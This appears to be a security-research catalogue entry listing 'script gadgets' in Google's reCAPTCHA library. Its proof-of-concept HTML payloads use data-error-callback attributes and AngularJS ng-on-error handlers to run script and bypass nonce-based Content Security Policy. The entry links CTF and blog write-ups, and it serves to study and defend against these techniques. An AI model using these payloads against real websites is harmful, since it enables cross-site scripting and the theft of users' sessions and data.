---
description: reCAPTCHA is a free service that protects your site from spam and abuse. It uses advanced risk analysis techniques to tell humans and bots apart.
gadgets:
  Latest (1):
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - class-attr
      - data-attr
      - before-lib-load
    pocs:
      - description: The [reCAPTCHA](https://developers.google.com/recaptcha) library allows to call a function under specific events (e.g. `error-callback`) through `data-*` attributes.
        code: |
          <script src="https://www.google.com/recaptcha/api.js" async defer></script>

          <!-- user input -->
          <x class="g-recaptcha" data-sitekey="1337" data-error-callback="alert"></x>
    links:
      - https://developers.google.com/recaptcha/docs/display#render_param
      - https://gist.github.com/terjanq/e2198440c4fdfbdec43e921b600d4a1d#recaptcha-for-the-rescue
      - https://blog.huli.tw/2022/04/13/en/notes-challenge-author-writeup/
  Latest (2):
    authors:
      - twitter:terjanq
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - wh-host-csp
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - description: The [reCAPTCHA](https://developers.google.com/recaptcha) library brings under the hood AngularJS.
        code: |
          <script nonce="secret" src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

          <!-- user input -->
          <img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)'>
      - description: The is another more generic payload that can be used to bypass CSP using error pages.
        code: |
          <script nonce="secret" src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

          <!-- user input -->
          <iframe id="ifr" src="/%GG"></iframe>
          <img src=x ng-on-error="
            win=$event.target.ownerDocument.defaultView;
            win.ifr.contentWindow.document.write.bind(win.ifr.contentWindow.document, ['<script>alert(document.domain)</script>'])()
          ">
    links:
      - https://github.com/google/google-ctf/tree/main/2023/quals/web-noteninja
      - https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/
---
